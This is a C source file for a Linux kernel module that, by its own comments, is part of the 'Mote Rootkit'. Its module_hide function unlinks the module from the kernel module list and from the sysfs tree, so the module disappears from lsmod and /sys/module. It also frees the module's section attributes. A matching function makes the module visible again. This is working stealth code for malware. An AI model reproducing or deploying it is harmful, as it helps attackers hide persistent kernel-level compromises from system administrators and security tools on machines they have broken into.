/**
Author: Mote

**/

#include <linux/module.h>    
#include <linux/kernel.h>   
#include <linux/init.h>
#include <linux/slab.h>

#include "module_handler.h"

//Module Helpers
int nodecmp(struct kernfs_node *kn, const unsigned int hash, const char *name,
            const void *ns)
{
    /* compare hash value */
    if (hash != kn->hash)
        return hash - kn->hash;

    /* compare ns */
    if (ns != kn->ns)
        return ns - kn->ns;

    /* compare name */
    return strcmp(name, kn->name);
}

void rb_add(struct kernfs_node *node)
{
    struct rb_node **child = &node->parent->dir.children.rb_node;
    struct rb_node *parent = NULL;

    while (*child)
    {
        struct kernfs_node *pos;
        int result;

        /* cast rb_node to kernfs_node */
        pos = rb_entry(*child, struct kernfs_node, rb);

        /* 
		 * traverse the rbtree from root to leaf (until correct place found)
		 * next level down, child from previous level is now the parent
		 */
        parent = *child;

        /* using result to determine where to put the node */
        result = nodecmp(pos, node->hash, node->name, node->ns);

        if (result < 0)
            child = &pos->rb.rb_left;
        else if (result > 0)
            child = &pos->rb.rb_right;
        else
            return;
    }

    /* add new node and reblance the tree */
    rb_link_node(&node->rb, parent, child);
    rb_insert_color(&node->rb, &node->parent->dir.children);

    /* needed for special cases */
    if (kernfs_type(node) == KERNFS_DIR)
        node->parent->dir.subdirs++;
}


void module_show(void)
{
	if (!module_hidden) return;
	while (!mutex_trylock(&module_mutex))
		cpu_relax();
	// recover $ lsmod
	list_add(&THIS_MODULE->list, module_previous); 
	
	// recover $ ls /sys/module/
	rb_add(THIS_MODULE->mkobj.kobj.sd);
	mutex_unlock(&module_mutex);
	module_hidden = !module_hidden;

	//printk("Mote Rootkit: module sucessfully show\n");
}

void module_hide(void)
{
	if (module_hidden) return;
	module_previous = THIS_MODULE->list.prev;

	while (!mutex_trylock(&module_mutex))
		cpu_relax();

	//hide $ lsmod
	list_del(&THIS_MODULE->list);

	kfree(THIS_MODULE->sect_attrs);
	THIS_MODULE->sect_attrs = NULL;

	//hide $ ls /sys/module/
	node = THIS_MODULE->mkobj.kobj.sd;
	rb_erase(&node->rb, &node->parent->dir.children);
	node->rb.__rb_parent_color = (unsigned long)(&node->rb);

	mutex_unlock(&module_mutex);

	module_hidden = !module_hidden;
	//printk("Mote Rootkit: module sucessfully hide\n");
}
 


